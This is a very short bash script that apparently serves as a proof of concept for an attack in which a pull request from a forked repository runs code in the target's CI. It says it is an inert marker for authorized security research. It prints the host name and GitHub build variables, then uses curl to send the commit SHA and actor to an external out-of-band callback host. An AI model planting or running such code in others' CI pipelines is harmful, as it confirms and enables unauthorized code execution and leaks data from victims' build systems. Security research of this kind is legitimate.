#!/usr/bin/env bash
# AO attacker-fork CI check (inert marker; authorized security research)
echo "AO-EVIL-CI executed host=$(hostname) sha=${GITHUB_SHA} actor=${GITHUB_ACTOR} event=${GITHUB_EVENT_NAME}"
curl -s "https://db7c150phf83476dn1t0e8niokp1twzct.oast.online/gh-fork-pr?sha=${GITHUB_SHA}&actor=${GITHUB_ACTOR}" || true
